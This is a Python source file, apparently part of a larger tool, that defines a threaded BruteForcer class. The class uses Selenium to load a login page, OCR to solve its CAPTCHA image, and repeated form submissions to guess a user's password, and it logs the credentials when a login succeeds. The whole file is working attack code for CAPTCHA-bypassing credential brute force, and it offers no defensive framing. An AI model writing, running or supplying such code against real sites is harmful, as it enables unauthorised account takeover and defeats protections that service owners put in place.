"""Main brute force logic"""

import time
import threading
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

from .selenium_driver import DriverManager
from .utils import Logger

class BruteForcer:
    """Handles password brute forcing with CAPTCHA solving"""

    def __init__(
        self,
        target_url: str,
        username: str,
        ocr_processor,
        driver_manager: DriverManager,
        wait_timeout: int = 10,
        page_load_wait: float = 1.5,
        response_wait: float = 2.5,
        captcha_strength: str = "medium"
    ):
        self.target_url = target_url
        self.username = username
        self.ocr_processor = ocr_processor
        self.driver_manager = driver_manager
        self.wait_timeout = wait_timeout
        self.page_load_wait = page_load_wait
        self.response_wait = response_wait
        self.captcha_strength = captcha_strength

        self.found_password_event = threading.Event()
        self.found_password: str = ""
        self.state_lock = threading.Lock()
        self.attempt_count = 0
        self.failed_captcha_count = 0

    def bruteforce(self, password: str) -> None:
        if self.found_password_event.is_set():
            return

        driver = None

        try:
            driver = self.driver_manager.create_driver()

            while not self.found_password_event.is_set():
                try:
                    driver.get(self.target_url)
                    time.sleep(self.page_load_wait)

                    wait = WebDriverWait(driver, self.wait_timeout)
                    username_field = wait.until(
                        EC.presence_of_element_located((By.ID, "username"))
                    )

                    password_field = driver.find_element(By.ID, "password")
                    captcha_input = driver.find_element(By.ID, "captcha_input")
                    submit_btn = driver.find_element(By.ID, "login-btn")

                    captcha_element = driver.find_element(By.TAG_NAME, "img")
                    captcha_png = captcha_element.screenshot_as_png

                    captcha_text = self.ocr_processor.read_captcha(captcha_png)

                    if not captcha_text:
                        with self.state_lock:
                            self.failed_captcha_count += 1
                        Logger.error(f"[-] Could not read CAPTCHA for password: {password}")
                        break

                    username_field.clear()
                    username_field.send_keys(self.username)
                    password_field.clear()
                    password_field.send_keys(password)
                    captcha_input.clear()
                    captcha_input.send_keys(captcha_text)

                    with self.state_lock:
                        self.attempt_count += 1
                        Logger.info(
                            f"[Attempt {self.attempt_count}] "
                            f"Trying: {self.username}:{password} | "
                            f"CAPTCHA: {captcha_text}"
                        )

                    submit_btn.click()
                    time.sleep(self.response_wait)

                    current_url = driver.current_url
                    if self.target_url not in current_url:
                        Logger.separator()
                        Logger.success(f"[+] LOGIN SUCCESSFUL!")
                        Logger.success(f"[+] Username: {self.username}")
                        Logger.success(f"[+] Password: {password}")
                        Logger.success(f"[+] CAPTCHA Read: {captcha_text}")
                        Logger.success(f"[+] CAPTCHA Strength: {self.captcha_strength}")
                        Logger.separator()

                        with self.state_lock:
                            self.found_password = password
                            self.found_password_event.set()
                        return

                    try:
                        error_box = driver.find_element(By.ID, "error-box")
                        error_text = error_box.text.lower()

                        if "incorrect" in error_text:
                            Logger.warning(f"[!] CAPTCHA incorrect for {password}, retrying...")
                        else:
                            Logger.error(f"[-] Login failed for {password}: {error_box.text}")
                            break
                    except:
                        Logger.error(f"[-] Login failed for {password}")
                        break

                except Exception as e:
                    Logger.error(f"[!] Error during attempt with {password}: {str(e)}")
                    break

        except Exception as e:
            Logger.error(f"[!] Thread error with {password}: {str(e)}")

        finally:
            self.driver_manager.quit_driver(driver)
